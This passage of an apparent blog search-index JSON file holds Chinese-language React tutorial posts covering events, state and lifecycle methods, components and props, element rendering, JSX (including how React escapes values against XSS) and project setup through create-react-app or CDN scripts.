null; &#125; return ( &lt;div className=\"warning\"&gt; Warning! &lt;/div&gt; );&#125;class Page extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;showWarning: true&#125; this.handleToggleClick = this.handleToggleClick.bind(this); &#125; handleToggleClick() &#123; this.setState(prevState =&gt; (&#123; showWarning: !prevState.showWarning &#125;)); &#125; render() &#123; return ( &lt;div&gt; &lt;WarningBanner warn=&#123;this.state.showWarning&#125; /&gt; &lt;button onClick=&#123;this.handleToggleClick&#125;&gt; &#123;this.state.showWarning ? 'Hide' : 'Show'&#125; &lt;/button&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;Page /&gt;, document.getElementById('root')); 从组件的 render 方法返回 null 不会影响组件生命周期方法的触发。 例如， componentWillUpdate 和 componentDidUpdate 仍将被调用。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之06-事件","slug":"React-gw-06","date":"2018-07-04T16:04:50.000Z","updated":"2018-07-06T04:00:31.895Z","comments":true,"path":"2018/07/05/React-gw-06/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/05/React-gw-06/","excerpt":"","text":"一、处理事件方式 通过 React 元素处理事件跟在 DOM 元素上处理事件非常相似。但是有一些语法上的区别： a、React 事件使用驼峰命名，而不是全部小写。 b、通过 JSX , 你传递一个函数作为事件处理程序，而不是一个字符串。 如： 123456789DOM:&lt;button onclick=\"activateLasers()\"&gt; Activate Lasers&lt;/button&gt;React:&lt;button onClick=&#123;activateLasers&#125;&gt; Activate Lasers&lt;/button&gt; 另一个区别是，在 React 中你不能通过返回 false 来阻止默认行为。必须明确调用 preventDefault 。例如: 123456789101112131415161718对于纯 HTML ，要阻止链接打开一个新页面的默认行为，可以这样写：&lt;a href=\"#\" onclick=\"console.log('The link was clicked.'); return false\"&gt; Click me&lt;/a&gt;在 React 中, 应该这么写:function ActionLink() &#123; function handleClick(e) &#123; e.preventDefault(); console.log('The link was clicked.'); &#125; return ( &lt;a href=\"#\" onClick=&#123;handleClick&#125;&gt; Click me &lt;/a&gt; );&#125; 这里 e 是一个合成的事件。 React 根据 W3C 规范定义了这个合成事件，所以你不需要担心跨浏览器的兼容性问题。 二、注意点 1）当使用 React 时，一般不需要调用 addEventListener 在 DOM 元素被创建后添加事件监听器，只要当元素被初始渲染的时候提供一个监听器就可以了。 2）当使用一个 ES6 类 定义一个组件时，通常一个事件处理程序是类上的一个方法。例如， Toggle 组件渲染一个按钮，让用户在 “ON” 和 “OFF” 状态之间切换： 12345678910111213141516171819202122232425262728class Toggle extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;isToggleOn: true&#125;; // 这个绑定是必要的，使`this`在回调中起作用 this.handleClick = this.handleClick.bind(this); &#125; handleClick() &#123; this.setState(prevState =&gt; (&#123; isToggleOn: !prevState.isToggleOn &#125;)); &#125; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125;&gt; &#123;this.state.isToggleOn ? 'ON' : 'OFF'&#125; &lt;/button&gt; ); &#125;&#125;ReactDOM.render( &lt;Toggle /&gt;, document.getElementById('root')); 在 JSX 回调中须注意 this 的指向。 JavaScript 中类方法默认没有绑定(bind) 的。如果你忘记绑定 this.handleClick 并将其传递给onClick，那么在直接调用该函数时，this 会是 undefined 。这不是 React 特有的行为，这是 JavaScript 中的函数如何工作的一部分。 一般情况下，如果你引用一个后面没跟 () 的方法，例如 onClick={this.handleClick} ，那你就应该 绑定(bind) 该方法。 如果调用 bind 烦恼，有两种方法可以解决这个问题: 使用实验性的属性初始化语法 ，可以使用属性初始值设置来正确地 绑定(bind) 回调，这个语法在 创建 React App 中是默认开启的。： 12345678910111213141516class LoggingButton extends React.Component &#123; // 这个语法确保 `this` 绑定在 handleClick 中。 // 警告：这是 *实验性的* 语法。 handleClick = () =&gt; &#123; console.log('this is:', this); &#125; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125;&gt; Click me &lt;/button&gt; ); &#125;&#125; 如果没有使用属性初始化语法，可以在回调中使用一个 箭头函数： 123456789101112131415class LoggingButton extends React.Component &#123; handleClick() &#123; console.log('this is:', this); &#125; render() &#123; // 这个语法确保 `this` 被绑定在 handleClick 中 return ( &lt;button onClick=&#123;(e) =&gt; this.handleClick(e)&#125;&gt; Click me &lt;/button&gt; ); &#125;&#125; 这个语法的问题是，每次 LoggingButton 渲染时都创建一个不同的回调。多数情况下没什么问题。然而如果这个回调被作为 prop(属性) 传递给下级组件，这些组件可能需要额外的重复渲染。我们建议在构造函数中进行绑定，以避免这类性能问题。 三、将参数传递给事件处理程序 在循环内部，通常需要将一个额外的参数传递给事件处理程序。 例如，如果 id 是一个内联 ID，则以下任一方式都可以正常工作： 12&lt;button onClick=&#123;(e) =&gt; this.deleteRow(id, e)&#125;&gt;Delete Row&lt;/button&gt;&lt;button onClick=&#123;this.deleteRow.bind(this, id)&#125;&gt;Delete Row&lt;/button&gt; 上述两行代码是等价的，分别使用 arrow functions 和 Function.prototype.bind 。 第一种参数 e 作为 React 事件对象作为第二个参数进行传递，通过箭头函数的方式，事件对象必须显式的进行传递；第二种通过 bind 的方式，事件对象以及更多的参数将会被隐式的进行传递。 值得注意的是，通过 bind 方式向监听函数传参，在类组件中定义的监听函数，事件对象 e 要排在所传递参数的后面，例如: 123456789101112131415161718192021class Popper extends React.Component&#123; constructor()&#123; super(); this.state = &#123;name:'Hello world!'&#125;; &#125; preventPop(name, e)&#123; //事件对象e要放在最后 e.preventDefault(); alert(name); &#125; render()&#123; return ( &lt;div&gt; &lt;p&gt;hello&lt;/p&gt; &#123;/* Pass params via bind() method. */&#125; &lt;a href=\"https://reactjs.org\" onClick=&#123;this.preventPop.bind(this,this.state.name)&#125;&gt;Click&lt;/a&gt; &lt;/div&gt; ); &#125;&#125; 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之05-状态","slug":"React-gw-05","date":"2018-07-04T13:27:58.000Z","updated":"2018-07-06T04:03:07.515Z","comments":true,"path":"2018/07/04/React-gw-05/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/04/React-gw-05/","excerpt":"","text":"一、时钟例子 目前更新UI我们是通过调用ReactDOM.render() 方法来更新渲染输出: 1234567891011121314function tick() &#123; const element = ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;new Date().toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); ReactDOM.render( element, document.getElementById('root') );&#125;setInterval(tick, 1000); 下面，我们学习更好的封装时钟组件，让其变得真正可复用。它将设置自己的计时器，每秒更新自身。 首先，封装时钟： 1234567891011121314151617function Clock(props) &#123; return ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;props.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; );&#125;function tick() &#123; ReactDOM.render( &lt;Clock date=&#123;new Date()&#125; /&gt;, document.getElementById('root') );&#125;setInterval(tick, 1000); 然而它没有满足一个关键要求，上面是通过设置定时器并每秒更新UI，事实上应该是clock自身实现的一部分。理想情况下，我们应该只引用一个clock然后让它自动计时并更新： 1234ReactDOM.render( &lt;Clock /&gt;, document.getElementById('root')); 要实现这点，我们需要添加 state(状态) 到 Clock 组件。state 和 props(属性) 类似，但是它是私有的，并且由组件本身完全控制。要添加state，组件须是类组件。 二、函数式组件转类组件 通过下面五步可将函数式组件转为类组件： a、创建一个继承自 React.Component 类的 ES6 class 同名类。 b、添加一个名为 render() 的空方法。 c、把原函数中的所有内容移至 render() 中。 d、在 render() 方法中使用 this.props 替代 props。 e、删除保留的空函数声明。 12345678910class Clock extends React.Component &#123; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;this.props.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125; Clock 现在被定为类组件，而不是函数式组件。类允许我们在其中添加本地状态(state)和生命周期钩子。 三、在类组件中添加本地状态state 通过以下3步, 把date从属性(props) 改为 状态(state)： a、替换 render() 方法中的 this.props.date 为 this.state.date： 12345678910class Clock extends React.Component &#123; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125; b、添加一个 类构造函数(class constructor) 初始化 this.state: 123456789101112131415class Clock extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125; c、移除 &lt; Clock /&gt; 元素中的 date 属性： 1234ReactDOM.render( &lt;Clock /&gt;, document.getElementById('root')); 再把计时器代码添加到组件内部，现有的结果是这样: 1234567891011121314151617181920class Clock extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;Clock /&gt;, document.getElementById('root')); 接下来，我们将使 Clock 设置自己的计时器，并每秒更新一次。 四、在类组件中添加生命周期方法 在一个具有许多组件的应用程序中，组件被销毁时释放所占用的资源是非常重要的。 当 Clock 第一次渲染到DOM时，我们要设置一个定时器 。 这在 React 中称为 “挂载” 。 当 Clock 产生的 DOM 被销毁时，我们要清除该计时器。 这在 React 中称为 “卸载” 。 当组件挂载和卸载时，我们可以在组件类上声明特殊的方法来运行一些代码： 1234567891011121314151617181920212223class Clock extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; componentDidMount() &#123; &#125; componentWillUnmount() &#123; &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125; 这些方法称为 “生命周期钩子”。componentDidMount() 钩子在组件输出被渲染到 DOM 之后运行，这是设置时钟的不错的位置： 123456componentDidMount() &#123; this.timerID = setInterval( () =&gt; this.tick(), 1000 );&#125; 注意我们把计时器ID直接存在 this 中。我们在componentWillUnmount()生命周期钩子中取消这个计时器： 123componentWillUnmount() &#123; clearInterval(this.timerID);&#125; 最后，我们将会实现每秒运行的 tick() 方法。它将使用 this.setState() 来周期性地更新组件本地状态： 12345678910111213141516171819202122232425262728293031323334353637class Clock extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; componentDidMount() &#123; this.timerID = setInterval( () =&gt; this.tick(), 1000 ); &#125; componentWillUnmount() &#123; clearInterval(this.timerID); &#125; tick() &#123; this.setState(&#123; date: new Date() &#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;Clock /&gt;, document.getElementById('root')); 现在，这个时钟每秒会走了，回顾一下过程： a、当 &lt; Clock /&gt; 被传入 ReactDOM.render() 时, React 会调用 Clock 组件的构造函数。 因为 Clock 要显示的是当前时间，所以它将使用包含当前时间的对象来初始化 this.state。我们稍后会更新此状态。 b、然后 React 调用了 Clock 组件的 render() 方法。 React 从该方法返回内容中得到要显示在屏幕上的内容。然后，React 然后更新 DOM 以匹配 Clock 的渲染输出。 c、当 Clock 输出被插入到 DOM 中时，React 调用 componentDidMount() 生命周期钩子。在该方法中，Clock 组件请求浏览器设置一个定时器来一次调用 tick()。 d、浏览器会每隔一秒调用一次 tick()方法。在该方法中， Clock 组件通过 setState() 方法并传递一个包含当前时间的对象来安排一个 UI 的更新。通过 setState(), React 得知了组件 state(状态)的变化, 随即再次调用 render() 方法，获取了当前应该显示的内容。 这次，render() 方法中的 this.state.date 的值已经发生了改变， 从而，其输出的内容也随之改变。React 于是据此对 DOM 进行更新。 d、如果通过其他操作将 Clock 组件从 DOM 中移除了, React 会调用 componentWillUnmount() 生命周期钩子, 所以计时器也会被停止。 五、正确地使用 State 关于 setState() 有三件事是你应该知道的： 1、不要直接修改 state： 例如这样将不会重新渲染一个组件： 12// 错误this.state.comment = 'Hello'; 用 setState() 代替： 12// 正确this.setState(&#123;comment: 'Hello'&#125;); 唯一可以初始化 this.state 的地方是构造函数。 2、state 更新可能是异步的： React 为了优化性能，有可能会将多个 setState() 调用合并为一次更新。因为 this.props 和 this.state 可能是异步更新的，所以你不能依赖他们的值计算下一个state(状态)。 例如以下代码可能导致 counter(计数器)更新失败： 1234// 错误this.setState(&#123; counter: this.state.counter + this.props.increment,&#125;); 要解决这个问题，应该使用第 2 种 setState() 的格式，它接收一个函数，而不是一个对象。该函数接收前一个状态值作为第 1 个参数， 并将更新后的值作为第 2个参数: 1234567891011// 正确this.setState((prevState, props) =&gt; (&#123; counter: prevState.counter + props.increment&#125;));// 正确this.setState(function(prevState, props) &#123; return &#123; counter: prevState.counter + props.increment &#125;;&#125;); 3、state 更新会被合并： 当你调用 setState()， React 将合并你提供的对象到当前的状态中。 例如你的状态可能包含几个独立的变量： 1234567constructor(props) &#123; super(props); this.state = &#123; posts: [], comments: [] &#125;;&#125; 然后通过调用独立的 setState() 调用分别更新它们: 12345678910111213componentDidMount() &#123; fetchPosts().then(response =&gt; &#123; this.setState(&#123; posts: response.posts &#125;); &#125;); fetchComments().then(response =&gt; &#123; this.setState(&#123; comments: response.comments &#125;); &#125;);&#125; 合并是浅合并，所以 this.setState({comments}) 不会改变 this.state.posts 的值，但会完全替换this.state.comments 的值。 六、数据向下流动 无论作为父组件还是子组件，它都无法获悉一个组件是否有状态，同时也不需要关心另一个组件是定义为函数组件还是类组件。这就是 state 经常被称为 本地状态 或 封装状态的原因。 它不能被 “拥有并设置它的组件” 以外的任何组件访问。 但一个组件可以选择将 state(状态) 向下传递，作为其子组件的 props(属性)： 12345&lt;FormattedDate date=&#123;this.state.date&#125; /&gt;function FormattedDate(props) &#123; return &lt;h2&gt;It is &#123;props.date.toLocaleTimeString()&#125;.&lt;/h2&gt;;&#125; 子组件FormattedDate 组件通过 props 接收了 date 的值，但它仍然不能获知该值是来自于 Clock的 state ，还是 Clock 的 props，或者是直接手动创建的。 这通常称为一个“从上到下”，或者“单向”的数据流。任何 state 始终由某个特定组件所有，并且从该 state 导出的任何数据 或 UI 只能影响树中 “下方” 的组件。 如果把组件树想像为 props(属性) 的瀑布，所有组件的 state(状态) 就如同一个额外的水源汇入主流，且只能随着主流的方向向下流动。 要证明所有组件都是完全独立的， 我们可以创建一个 App 组件，并在其中渲染 3 个 ，每个 Clock 都设置它自己的计时器并独立更新: 1234567891011121314function App() &#123; return ( &lt;div&gt; &lt;Clock /&gt; &lt;Clock /&gt; &lt;Clock /&gt; &lt;/div&gt; );&#125;ReactDOM.render( &lt;App /&gt;, document.getElementById('root')); 在 React 应用中，一个组件是否是有状态或者无状态的，被认为是组件的一个实现细节，随着时间推移可能发生改变。你可以在有状态的组件中使用无状态组件，反之亦然。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之04-组件","slug":"React-gw-04","date":"2018-07-04T12:19:12.000Z","updated":"2018-07-06T04:01:18.152Z","comments":true,"path":"2018/07/04/React-gw-04/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/04/React-gw-04/","excerpt":"","text":"一、组件定义 组件可将UI划分为一个个独立、可复用的小部件，这样你可对每个部件进行单独的设计。组件可以接收任意输入props，并返回react元素，用以描述屏幕显示内容。 二、函数式组件和类组件 函数式组件即，写一个 JavaScript 函数，接收一个 props 参数, 返回一个 React 元素： 123function Welcome(props) &#123; return &lt;h1&gt;Hello, &#123;props.name&#125;&lt;/h1&gt;;&#125; 类组件即，用 ES6 的 class 来定义一个组件: 12345class Welcome extends React.Component &#123; render() &#123; return &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt;; &#125;&#125; 上面两个组件从 React 的角度来看是等效的。 三、渲染一个组件 前面，我们遇到的 React 元素都只是 DOM 标签 ： 1const element = &lt;div /&gt;; 然而，元素也可以代表用户定义的组件： 1const element = &lt;Welcome name=\"Sara\" /&gt;; 当 React 遇到的元素是用户自定义的组件时，它会将 JSX 属性以一个单独对象的形式传递给相应的组件。 我们将其称为 “props” 对象。 看个例子： 123456789function Welcome(props) &#123; return &lt;h1&gt;Hello, &#123;props.name&#125;&lt;/h1&gt;;&#125;const element = &lt;Welcome name=\"Sara\" /&gt;;ReactDOM.render( element, document.getElementById('root')); 例子流程： a、调用了ReactDOM.render() 方法并向其中传入了 &lt; Welcome name=”Sara” /&gt; 元素。 b、React 调用 Welcome 组件，并向其中传入了 {name: ‘Sara’} 作为 props 对象。 c、Welcome 组件返回 &lt; h1&gt;Hello, Sara&lt; /h1&gt; 。 d、React DOM 迅速更新 DOM ，使其显示为 &lt; h1&gt;Hello, Sara&lt; /h1&gt;。 注意： a、组件名称总是以大写字母开始。 b、举例来说, &lt; div /&gt; 代表一个 DOM 标签，而 &lt; Welcome /&gt; 代表一个组件，并且在使用该组件时你必须定义或引入它。 四、组合组件 组件可以在它们的输出中引用其它组件，这使我们可以使用同样的组件来抽象到任意层级。在React应用中，按钮，表单，对话框，屏幕等通常都被表示为组件。 例如，我们可以创建一个 App 组件，并在其内部多次渲染 Welcome： 123456789101112131415161718function Welcome(props) &#123; return &lt;h1&gt;Hello, &#123;props.name&#125;&lt;/h1&gt;;&#125;function App() &#123; return ( &lt;div&gt; &lt;Welcome name=\"Sara\" /&gt; &lt;Welcome name=\"Cahal\" /&gt; &lt;Welcome name=\"Edite\" /&gt; &lt;/div&gt; );&#125;ReactDOM.render( &lt;App /&gt;, document.getElementById('root')); 通常，新的React apps都有一个单独的顶层App组件。然而如果你在已有的应用中整合 React，你可以由下至上地, 从类似于Button这样的小组件开始, 逐渐整合到视图层的顶层。 注意： a、组件必须返回一个单独的根元素，这就是为什么我们添加一个 &lt; div&gt; 来包含所有 &lt; Welcome /&gt; 元素的原因。 五、提取组件 不要害怕把一个组件分为多个更小的组件，看下面： 123456789101112131415161718192021function Comment(props) &#123; return ( &lt;div className=\"Comment\"&gt; &lt;div className=\"UserInfo\"&gt; &lt;img className=\"Avatar\" src=&#123;props.author.avatarUrl&#125; alt=&#123;props.author.name&#125; /&gt; &lt;div className=\"UserInfo-name\"&gt; &#123;props.author.name&#125; &lt;/div&gt; &lt;/div&gt; &lt;div className=\"Comment-text\"&gt; &#123;props.text&#125; &lt;/div&gt; &lt;div className=\"Comment-date\"&gt; &#123;formatDate(props.date)&#125; &lt;/div&gt; &lt;/div&gt; );&#125; 它接受 author（一个对象），text（一个字符串）和 date（一个日期）作为 props，用于在某社交网站中描述一条评论。这个组件修改起来很麻烦，因为它是被嵌套的，而且很难复用其中的某个部分。所以让我们从其中提取一些组件。 首先，提取头像 Avatar： 123456789function Avatar(props) &#123; return ( &lt;img className=\"Avatar\" src=&#123;props.user.avatarUrl&#125; alt=&#123;props.user.name&#125; /&gt; );&#125; Avatar 组件不用关心它在 Comment 中是如何渲染的。这就是为什么它的 prop 是一个更通用的属性名: user, 而不是 author 的原因。我们建议从组件本身的角度来命名 props 而不是它被使用的上下文环境。 接下来，我们提取用户信息 UserInfo 组件， 用于将 Avatar 显示在用户名旁边： 12345678910function UserInfo(props) &#123; return ( &lt;div className=\"UserInfo\"&gt; &lt;Avatar user=&#123;props.user&#125; /&gt; &lt;div className=\"UserInfo-name\"&gt; &#123;props.user.name&#125; &lt;/div&gt; &lt;/div&gt; );&#125; 接着简化一下 Comment 组件: 12345678910111213function Comment(props) &#123; return ( &lt;div className=\"Comment\"&gt; &lt;UserInfo user=&#123;props.author&#125; /&gt; &lt;div className=\"Comment-text\"&gt; &#123;props.text&#125; &lt;/div&gt; &lt;div className=\"Comment-date\"&gt; &#123;formatDate(props.date)&#125; &lt;/div&gt; &lt;/div&gt; );&#125; 提取组件看起来是一个繁琐的工作，但是在大型的Apps中可提供大量的可复用组件。如果你 UI 的一部分需要用多次 (Button，Panel，Avatar)，或者本身足够复杂(App，FeedStory，Comment)，最好的做法是使其成为可复用组件。 六、Props 是只读的 无论你用函数或类的方法来声明组件, 它都无法修改其自身 props 看下面： 123function sum(a, b) &#123; return a + b;&#125; 这种函数称为“纯函数”，它们不会试图改变它们的输入，并且对于同样的输入,始终可以得到相同的结果。 而下面： 123function withdraw(account, amount) &#123; account.total -= amount;&#125; 这是非纯函数， 因为它改变了自身的输入值。 React 很灵活，但是它有一条严格的规则：所有 React 组件都必须是纯函数，并禁止修改其自身 props 。 当然，应用 UI 总是动态的，并且随时有可以改变。 所以有一个新的概念 state(状态) ，允许 React 组件在不违反上述规则的情况下, 根据用户操作, 网络响应, 或者其他随便什么东西, 来动态地改变其输出。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之03-元素渲染","slug":"React-gw-03","date":"2018-07-04T12:04:44.000Z","updated":"2019-01-25T10:18:02.554Z","comments":true,"path":"2018/07/04/React-gw-03/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/04/React-gw-03/","excerpt":"","text":"一、React元素定义 元素是构成React应用的最小单位。用于描述你在将在屏幕上看到的内容： 1const element = &lt;h1&gt;Hello, world&lt;/h1&gt;; 不同于浏览器的DOM元素，React中的元素是普通的对象。React DOM可以确保浏览器DOM的数据内容与React元素一致。 二、渲染一个元素到 DOM 假设HTML文件中有一个 div ： 1&lt;div id=\"root\"&gt;&lt;/div&gt; 我们称这个是一个 “root” DOM节点，因为该节点内的所有内容都由React DOM管理。单纯用React构建的应用程序通常只有一个单独的根DOM节点。但如果你要把 React整合进现有的app中 ，那可能会有多个相互独立的 root DOM节点。 要渲染一个React元素到一个root DOM节点，把它们传递给ReactDOM.render()方法： 123456const element = &lt;h1&gt;Hello, world&lt;/h1&gt;;ReactDOM.render( element, document.getElementById('root')); 三、更新已渲染的元素 React元素是不可突变的，当元素被创建后，就不能再修改其内容或任何属性。一个元素就像电影里的一帧，它代表应用界面在某一时间点的样子。 现阶段更新UI的唯一方法是创建一个新的元素, 并将其传入 ReactDOM.render() 方法。 看个计时器的例子： 1234567891011121314function tick() &#123; const element = ( &lt;div&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;h2&gt;It is &#123;new Date().toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); ReactDOM.render( element, document.getElementById('root') );&#125;setInterval(tick, 1000); 以上代码每隔1秒, 就会通过setInterval()回调ReactDOM.render()方法来重新渲染元素。而实际上，大多数 React 应用只会调用 ReactDOM.render() 一次。 四、React只更新必需更新的部分 React DOM会将元素及其子元素与之前版本逐一对比, 在渲染过程中只会更新改变了的部分。 比如上面计时器的例子的效果看下图： 即便我们每秒都创建了一个描述整个UI树的新元素，React DOM 也只会更新渲染文本节点中发生变化的内容。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之02-JSX","slug":"React-gw-02","date":"2018-07-04T11:43:17.000Z","updated":"2018-07-06T04:01:46.705Z","comments":true,"path":"2018/07/04/React-gw-02/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/04/React-gw-02/","excerpt":"","text":"一、JSX介绍 一种javascript的扩展语法,可生成react元素，推荐在react中使用这种语法来描述UI信息，它具有javascript的全部能力： 1const element = &lt;h1&gt;Hello, world!&lt;/h1&gt;; 二、JSX中嵌入表达式 可用花括号把任意的javascript表达式嵌入到JSX中： 12345678910111213141516171819const user = &#123; firstName: 'Harper', lastName: 'Perez'&#125;;function formatName(user) &#123; return user.firstName + ' ' + user.lastName;&#125;const element = ( &lt;h1&gt; Hello, &#123;formatName(user)&#125;! &lt;/h1&gt;);ReactDOM.render( element, document.getElementById('root')); 三、JSX也是一个表达式 编译之后JSX表达式就变成了常规的javascript对象。这意味着可以在if语句或者for循环中使用JSX，用它给变量赋值，当作参数接收，或者作为函数返回值： 123456function getGreeting(user) &#123; if (user) &#123; return &lt;h1&gt;Hello, &#123;formatName(user)&#125;!&lt;/h1&gt;; &#125; return &lt;h1&gt;Hello, Stranger.&lt;/h1&gt;;&#125; 四、用JSX指定属性值 可以使用双引号来指定字符串字面量作为属性值： 1const element = &lt;div tabIndex=\"0\"&gt;&lt;/div&gt;; 也可以用花括号嵌入一个 JavaScript 表达式作为属性值: 1const element = &lt;img src=&#123;user.avatarUrl&#125;&gt;&lt;/img&gt;; 在属性中嵌入 JavaScript 表达式时，不要使用引号来包裹大括号。否则，JSX 将该属性视为字符串字面量而不是表达式。对于字符串值你应该使用引号，对于表达式你应该使用大括号，但两者不能同时用于同一属性。 五、JSX嵌套 如果是空标签，您应该像 XML/HTML 一样，使用 /&gt;立即闭合它： 1const element = &lt;img src=&#123;user.avatarUrl&#125; /&gt;; JSX 标签同样可以互相嵌套： 123456const element = ( &lt;div&gt; &lt;h1&gt;Hello!&lt;/h1&gt; &lt;h2&gt;Good to see you here.&lt;/h2&gt; &lt;/div&gt;); 六、JSX防止注入攻击 默认情况下， 在渲染之前React DOM 会格式化(escapes)JSX中的所有值，从而保证用户无法注入任何应用之外的代码，在被渲染之前所有的数据都被转义成为了字符串处理。 以避免 XSS(跨站脚本) 攻击。所以，在JSX中嵌入用户输入是安全的： 123const title = response.potentiallyMaliciousInput;// 这样是安全的:const element = &lt;h1&gt;&#123;title&#125;&lt;/h1&gt;; 七、JSX表示对象 Babel 将JSX编译成 React.createElement() 调用，下面的两个例子是是完全相同的： 1234567891011const element = ( &lt;h1 className=\"greeting\"&gt; Hello, world! &lt;/h1&gt;);const element = React.createElement( 'h1', &#123;className: 'greeting'&#125;, 'Hello, world!'); React.createElement()会执行一些检查来帮助你编写没有bug的代码，但基本上它会创建一个如下所示的对象： 12345678// 注意: 这是简化的结构const element = &#123; type: 'h1', props: &#123; className: 'greeting', children: 'Hello, world' &#125;&#125;; 这些对象被称作“React元素”。你可以把他们想象成你想在屏幕上显示内容的一种描述。React会读取这些对象，用他们来构建DOM，并且保持它们的不断更新。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之01-react使用","slug":"React-gw-01","date":"2018-07-03T18:20:07.000Z","updated":"2018-07-06T04:02:14.842Z","comments":true,"path":"2018/07/04/React-gw-01/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/04/React-gw-01/","excerpt":"","text":"一、react使用方式 1）使用react.js官网提供的脚手架； 2）在原有项目中安装载入react； 3）在HTML页面中引入react.js，配合其他使用； 二、使用react.js官网提供的脚手架（cmd） 1）先安装node.js 6.0以上版本 1傻瓜式安装（node -v查看版本你） 2）npm包管理器 1集成在node中（npm -v查看版本） 3）全局安装create-react-app脚手架构建工具 1npm install -g create-react-app 4）选取项目目录，构建react应用程序 1create-react-app my-app 5）进入目录 1cd my-app 6）运行脚手架 1npm start 三、在原有项目中安装载入react 使用yarn或者npm安装 推荐配合Babel使用react，可以使我们在js中使用ES6与JSX 推荐配合webpack或browerify打包工具，可以优化打包react 四、在HTML页面中引入react.js，配合其他使用 React 和 ReactDOM 的UMD版本可通过 CDN 获得： 12&lt;script crossorigin src=\"https://unpkg.com/react@16/umd/react.development.js\"&gt;&lt;/script&gt;&lt;script crossorigin src=\"https://unpkg.com/react-dom@16/umd/react-dom.development.js\"&gt;&lt;/script&gt; 上面的版本只适合开发环境，不适合生产环境。压缩并优化后的 React 可用生产版本在： 12&lt;script crossorigin src=\"https://unpkg.com/react@16/umd/react.production.min.js\"&gt;&lt;/script&gt;&lt;script crossorigin src=\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"&gt;&lt;/script&gt; 如果要加载指定版本的react和react-dom，只要把以上代码中的16替换为相应的版本数字即可。 如果从CDN引用React，建议保留crossorigin属性设置，这可以在React16及更高版本中实现更好的错误处理体验。 五、helloworld 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;title&gt;Hello World&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div 